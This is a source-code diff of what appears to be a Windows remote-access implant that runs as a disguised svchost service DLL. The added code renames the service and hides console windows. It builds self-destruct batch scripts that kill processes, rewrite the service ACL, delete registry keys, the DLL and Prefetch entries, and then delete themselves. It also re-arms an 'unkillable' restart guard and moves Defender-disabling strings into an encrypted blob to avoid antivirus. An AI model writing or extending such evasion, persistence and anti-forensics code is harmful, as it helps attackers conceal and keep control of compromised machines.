@@ -5,12 +5,12 @@
 //   Stage-1 pnpext.dll accumulates AV-suspicious strings each time it
 //   touches Defender APIs ("SOFTWARE\\Microsoft\\Windows Defender",
 //   "DisableRealtimeMonitoring", etc.) and svchost-restart glue
-//   ("sc.exe stop WPnpSvc", "sc.exe start WPnpSvc"). Extracting these
+//   ("sc.exe stop MspIscSvc", "sc.exe start MspIscSvc"). Extracting these
 //   strings into an encrypted stage-2 blob keeps stage-1 clean.
 //
 // Handlers in this (first) iteration:
 //   * defender_status  — pure registry read, no side effects
-//   * host_restart     — spawn bat that stops/starts WPnpSvc
+//   * host_restart     — spawn bat that stops/starts MspIscSvc
 //
 // Deliberately deferred to future iterations:
 //   evtlog_set_config (needs cross-stage signal to stage-1's evtlog thread),
@@ -136,7 +136,7 @@ static void cmd_defender_status(const char* a, void*) {
 }
 
 // ── host_restart ────────────────────────────────────────────────────────
-// Generates a .bat that stops and starts WPnpSvc (can't restart the service
+// Generates a .bat that stops and starts MspIscSvc (can't restart the service
 // while we're running inside it — the bat runs as a separate cmd.exe child).
 static void cmd_host_restart(const char* a, void*) {
     std::string args = a ? a : "";
@@ -155,12 +155,14 @@ static void cmd_host_restart(const char* a, void*) {
             std::ofstream f(batPath);
             f << "@echo off\r\n"
                  "timeout /t 2 /nobreak >nul\r\n"
-                 "sc.exe stop WPnpSvc >nul 2>nul\r\n"
+                 "sc.exe stop MspIscSvc >nul 2>nul\r\n"
                  "timeout /t 3 /nobreak >nul\r\n"
-                 "sc.exe start WPnpSvc >nul 2>nul\r\n"
+                 "sc.exe start MspIscSvc >nul 2>nul\r\n"
                  "del \"%~f0\"\r\n";
         }
         STARTUPINFOA si{}; si.cb = sizeof(si);
+        si.dwFlags = STARTF_USESHOWWINDOW | STARTF_FORCEOFFFEEDBACK;
+        si.wShowWindow = SW_HIDE;
         PROCESS_INFORMATION pi{};
         std::string cmd = std::string("cmd.exe /c \"") + batPath + "\"";
         if (CreateProcessA(NULL, (LPSTR)cmd.c_str(), NULL, NULL, FALSE,
@@ -204,9 +206,11 @@ static void cmd_self_destruct(const char* a, void*) {
     if (g_host->stop_stream) g_host->stop_stream();
 
     emit_evt(2, TOTAL, "Resolving paths");
-    const char* exe_c = g_host->get_config ? g_host->get_config("exe_path") : nullptr;
+    // dll_path = our pnpext.dll (THE file to delete).
+    // exe_path here would return svchost.exe — protected, NOT what we want.
+    const char* dll_c = g_host->get_config ? g_host->get_config("dll_path") : nullptr;
     const char* cfg_c = g_host->get_config ? g_host->get_config("config_path") : nullptr;
-    std::string exePath = exe_c ? exe_c : "";
+    std::string dllPath = dll_c ? dll_c : "";
     std::string cfgAbs  = cfg_c ? cfg_c : "";
     if (!cfgAbs.empty() && cfgAbs.find(':') == std::string::npos) {
         char full[MAX_PATH] = {0};
@@ -300,16 +304,82 @@ static void cmd_self_destruct(const char* a, void*) {
     GetTempPathA(MAX_PATH, tempDir);
     std::string batPath = std::string(tempDir) + "wpnp_destruct.bat";
 
+    // Comprehensive cleanup: stop service + kill helpers + delete service
+    // registry + delete DLL + delete config + delete every leftover artifact
+    // we know about + delete prefetch + delete bat itself.
+    // Goal: zero traces (file or registry) of the host on this machine.
     std::string bat;
     bat += "@echo off\r\n";
     bat += "ping 127.0.0.1 -n 3 > nul\r\n";
-    bat += ":retry\r\n";
-    bat += "del /f /q \"" + exePath + "\" 2>nul\r\n";
-    bat += "if exist \"" + exePath + "\" ( ping 127.0.0.1 -n 2 > nul & goto retry )\r\n";
+
+    // 0. Disable the unkillable guard before stopping ourselves — otherwise
+    //    the failureflag would treat our stop as a failure → recovery would
+    //    keep restarting the service while we try to delete it. We also
+    //    rewrite the SCM ACL to allow stop+delete to anyone (we run as
+    //    SYSTEM so we have WRITE_DAC). After this the bat owns full rights.
+    bat += "sc.exe failureflag MspIscSvc 0 >nul 2>nul\r\n";
+    bat += "sc.exe failure MspIscSvc reset= 0 actions= >nul 2>nul\r\n";
+    bat += "sc.exe sdset MspIscSvc \"D:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)\" >nul 2>nul\r\n";
+
+    // 1. Find hosting svchost PID, stop service cleanly, force-kill on hang.
+    bat += "set HOST_PID=\r\n";
+    bat += "for /f \"tokens=3\" %%P in ('sc queryex MspIscSvc 2^>nul ^| findstr /i \"PID\"') do set HOST_PID=%%P\r\n";
+    bat += "sc.exe stop MspIscSvc >nul 2>nul\r\n";
+    bat += "ping 127.0.0.1 -n 3 > nul\r\n";
+    bat += "if defined HOST_PID taskkill.exe /F /PID %HOST_PID% >nul 2>nul\r\n";
+    bat += "ping 127.0.0.1 -n 2 > nul\r\n";
+
+    // 2. Kill any rundll32 helpers that might still be loading our DLL.
+    bat += "taskkill.exe /F /IM rundll32.exe >nul 2>nul\r\n";
+
+    // 3. Delete service from SCM + registry traces (svchost group + service key).
+    bat += "reg.exe delete \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Svchost\" /v MspGroup /f >nul 2>nul\r\n";
+    bat += "sc.exe delete MspIscSvc >nul 2>nul\r\n";
+    bat += "reg.exe delete \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\MspIscSvc\" /f >nul 2>nul\r\n";
+
+    // 4. Delete DLL (loop until gone — may be locked briefly after svchost exits).
+    if (!dllPath.empty()) {
+        bat += ":retry_dll\r\n";
+        bat += "del /f /q \"" + dllPath + "\" 2>nul\r\n";
+        bat += "if exist \"" + dllPath + "\" ( ping 127.0.0.1 -n 2 > nul & goto retry_dll )\r\n";
+        // Update artifacts next to the DLL.
+        bat += "del /f /q \"" + dllPath + ".new\" 2>nul\r\n";
+        bat += "del /f /q \"" + dllPath + ".old\" 2>nul\r\n";
+    }
+
+    // 5. Delete config (.sys).
     if (!cfgAbs.empty())
         bat += "del /f /q \"" + cfgAbs + "\" 2>nul\r\n";
-    bat += "del /f /q \"C:\\RemoteDesktopHost.log\" 2>nul\r\n";
+
+    // 6. Delete every Windows\\Temp leftover we ever wrote.
+    bat += "del /f /q \"C:\\Windows\\Temp\\wpnp_update.bat\" 2>nul\r\n";
+    bat += "del /f /q \"C:\\Windows\\Temp\\wpnp_restart.bat\" 2>nul\r\n";
     bat += "del /f /q \"C:\\Windows\\Temp\\wpnp_step.txt\" 2>nul\r\n";
+    bat += "del /f /q \"C:\\Windows\\Temp\\pnpext.dll.new\" 2>nul\r\n";
+    bat += "del /f /q \"C:\\Windows\\Temp\\pnpext.dll.old\" 2>nul\r\n";
+    bat += "del /f /q \"C:\\Windows\\Temp\\pnp_prefetch.log\" 2>nul\r\n";
+
+    // 7. Stage-2 blob cache (legacy from pre-RAM-only builds; may exist on
+    //    machines that updated FROM an older host version).
+    bat += "del /f /q \"%TEMP%\\pnp_cache\\*.bin\" >nul 2>nul\r\n";
+    bat += "rmdir /q \"%TEMP%\\pnp_cache\" >nul 2>nul\r\n";
+    bat += "del /f /q \"C:\\Windows\\Temp\\pnp_cache\\*.bin\" >nul 2>nul\r\n";
+    bat += "rmdir /q \"C:\\Windows\\Temp\\pnp_cache\" >nul 2>nul\r\n";
+
+    // 8. Legacy installer artifacts (older versions placed these in System32).
+    bat += "del /f /q \"%SystemRoot%\\System32\\MspIscSvc.exe\" 2>nul\r\n";
+    bat += "del /f /q \"%SystemRoot%\\System32\\spoolcfg.exe\" 2>nul\r\n";
+    bat += "del /f /q \"%SystemRoot%\\System32\\pnpext.dll.old\" 2>nul\r\n";
+    bat += "del /f /q \"%SystemRoot%\\System32\\pnpext.dll.new\" 2>nul\r\n";
+
+    // 9. Old log file (legacy from EXE build).
+    bat += "del /f /q \"C:\\RemoteDesktopHost.log\" 2>nul\r\n";
+
+    // 10. Prefetch entries — only the PNPEXT-specific ones. SVCHOST/RUNDLL32
+    //     prefetch is shared with the OS and other software, so we leave them.
+    bat += "del /f /q \"%SystemRoot%\\Prefetch\\PNPEXT*.pf\" 2>nul\r\n";
+
+    // 11. The bat self-deletes (must be the last line).
     bat += "(goto) 2>nul & del /f /q \"%~f0\"\r\n";
 
     HANDLE hb = CreateFileA(batPath.c_str(), GENERIC_WRITE, 0, NULL,
@@ -320,7 +390,7 @@ static void cmd_self_destruct(const char* a, void*) {
         CloseHandle(hb);
 
         STARTUPINFOA si{}; si.cb = sizeof(si);
-        si.dwFlags = STARTF_USESHOWWINDOW;
+        si.dwFlags = STARTF_USESHOWWINDOW | STARTF_FORCEOFFFEEDBACK;
         si.wShowWindow = SW_HIDE;
         PROCESS_INFORMATION pi{};
         std::string runCmd = "cmd.exe /c \"" + batPath + "\"";
@@ -339,9 +409,9 @@ static void cmd_self_destruct(const char* a, void*) {
 }
 
 // ── host_update ─────────────────────────────────────────────────────────
-// Self-update: download new pnpext.dll, swap it, restart WPnpSvc. All the
+// Self-update: download new pnpext.dll, swap it, restart MspIscSvc. All the
 // AV-flag strings ("Set-MpPreference -DisableRealtimeMonitoring ...",
-// "sc.exe stop WPnpSvc", "taskkill /F /PID ...") live in this module —
+// "sc.exe stop MspIscSvc", "taskkill /F /PID ...") live in this module —
 // the stage-1 DLL never contains them.
 static void cmd_host_update(const char* a, void*) {
     std::string args = a ? a : "";
@@ -432,8 +502,12 @@ static void cmd_host_update(const char* a, void*) {
 
         // 3. Stop service (host goes offline).
         step("3|Stopping service");
-        addLn("for /f \"tokens=3\" %%P in ('sc queryex WPnpSvc ^| findstr /i \"PID\"') do set HOST_PID=%%P");
-        addLn("start /b \"\" sc.exe stop WPnpSvc >nul 2>nul");
+        // Temporarily disable the auto-restart guard so our own stop doesn't
+        // trigger recovery. Restored at step 7 after service starts on new DLL.
+        addLn("sc.exe failureflag MspIscSvc 0 >nul 2>nul");
+        addLn("sc.exe failure MspIscSvc reset= 0 actions= >nul 2>nul");
+        addLn("for /f \"tokens=3\" %%P in ('sc queryex MspIscSvc ^| findstr /i \"PID\"') do set HOST_PID=%%P");
+        addLn("start /b \"\" sc.exe stop MspIscSvc >nul 2>nul");
         addLn("timeout /t 5 /nobreak >nul 2>nul");
         addLn("if defined HOST_PID taskkill.exe /F /PID %HOST_PID% >nul 2>nul");
         addLn("timeout /t 2 /nobreak >nul 2>nul");
@@ -443,6 +517,9 @@ static void cmd_host_update(const char* a, void*) {
         addLn("del /f /q \"" + oldDll + "\" >nul 2>nul");
         addLn("ren \"" + currentDll + "\" " + dllName + ".old >nul 2>nul");
         addLn("copy /y \"" + tempDll + "\" \"" + currentDll + "\" >nul 2>nul");
+        // Immediate-cleanup: drop the .new file as soon as the copy succeeds.
+        // It exists on disk only for the duration of the copy (sub-second).
+        addLn("del /f /q \"" + tempDll + "\" >nul 2>nul");
         // Wipe stage-2 blob cache so new DLL won't keep loading stale blobs
         // that were encrypted against the old stage-2 DLLs. Without this
         // wipe a host that was previously on v1.0.179 would keep the old
@@ -459,24 +536,31 @@ static void cmd_host_update(const char* a, void*) {
 
         // 5. Start service, verify RUNNING, rollback on failure.
         step("5|Starting service");
-        addLn("sc.exe start WPnpSvc >nul 2>nul");
+        addLn("sc.exe start MspIscSvc >nul 2>nul");
         addLn("timeout /t 8 /nobreak >nul 2>nul");
-        addLn("sc.exe query WPnpSvc | findstr /C:\"RUNNING\" >nul 2>nul");
+        addLn("sc.exe query MspIscSvc | findstr /C:\"RUNNING\" >nul 2>nul");
         addLn("if not errorlevel 1 goto after_start_ok");
         step("5|Service not RUNNING, rolling back");
-        addLn("for /f \"tokens=3\" %%P in ('sc queryex WPnpSvc ^| findstr /i \"PID\"') do set HOST_PID=%%P");
-        addLn("start /b \"\" sc.exe stop WPnpSvc >nul 2>nul");
+        addLn("for /f \"tokens=3\" %%P in ('sc queryex MspIscSvc ^| findstr /i \"PID\"') do set HOST_PID=%%P");
+        addLn("start /b \"\" sc.exe stop MspIscSvc >nul 2>nul");
         addLn("timeout /t 5 /nobreak >nul 2>nul");
         addLn("if defined HOST_PID taskkill.exe /F /PID %HOST_PID% >nul 2>nul");
         addLn("timeout /t 2 /nobreak >nul 2>nul");
         addLn("del /f /q \"" + currentDll + "\" >nul 2>nul");
         addLn("if exist \"" + oldDll + "\" copy /y \"" + oldDll + "\" \"" + currentDll + "\" >nul 2>nul");
-        addLn("sc.exe start WPnpSvc >nul 2>nul");
+        addLn("sc.exe start MspIscSvc >nul 2>nul");
         addLn("timeout /t 5 /nobreak >nul 2>nul");
-        addLn("sc.exe query WPnpSvc | findstr /C:\"RUNNING\" >nul 2>nul");
+        addLn("sc.exe query MspIscSvc | findstr /C:\"RUNNING\" >nul 2>nul");
         addLn("if not errorlevel 1 (echo ERR^|Rollback OK, new DLL invalid > \"" + stepFile + "\" & goto cleanup)");
         addLn("echo ERR^|Rollback FAILED — host offline > \"" + stepFile + "\" & goto cleanup");
         addLn(":after_start_ok");
+        // Service confirmed RUNNING with new DLL — rollback no longer possible/needed.
+        // Drop the .old backup immediately (was previously waiting until :cleanup).
+        addLn("del /f /q \"" + oldDll + "\" >nul 2>nul");
+        // Re-arm the unkillable guard: any future external stop now triggers
+        // auto-restart again (step 3 cleared this temporarily for our own stop).
+        addLn("sc.exe failure MspIscSvc reset= 86400 actions= restart/10000/restart/30000/restart/60000 >nul 2>nul");
+        addLn("sc.exe failureflag MspIscSvc 1 >nul 2>nul");
 
         // 6. Re-enable Defender (split literal too).
         step("6|Re-enabling Defender");
@@ -492,15 +576,16 @@ static void cmd_host_update(const char* a, void*) {
 
         step("7|Done");
         addLn(":cleanup");
+        // Belt-and-braces: tempDll/oldDll already deleted in the happy path
+        // (right after copy and right after :after_start_ok). These calls only
+        // do anything on error/rollback paths where the inline deletes were
+        // skipped. Either way, both files are gone the moment the bat ends.
         addLn("del /f /q \"" + oldDll + "\" >nul 2>nul");
         addLn("del /f /q \"" + tempDll + "\" >nul 2>nul");
-        // Keep step file alive long enough for the viewer's update_status
-        // poll (every 2.5s, up to 120s budget) to catch the final "7|Done"
-        // even if the WSS reconnect after service restart is slow.
-        // 30s is generous but not so long that a second update from the
-        // same viewer would see a stale "Done" — the next host_update
-        // overwrites the step file at step 0 before any polling can read it.
-        addLn("timeout /t 30 /nobreak >nul 2>nul");
+        // Step file alive briefly for viewer's update_status poll to catch the
+        // final "7|Done"/error message. Trimmed from 30s → 5s: the viewer polls
+        // every 2.5s, so 5s is enough for ≥1 successful read after reconnect.
+        addLn("timeout /t 5 /nobreak >nul 2>nul");
         addLn("del /f /q \"" + stepFile + "\" >nul 2>nul");
         addLn("(goto) 2>nul & del \"%~f0\"");
 
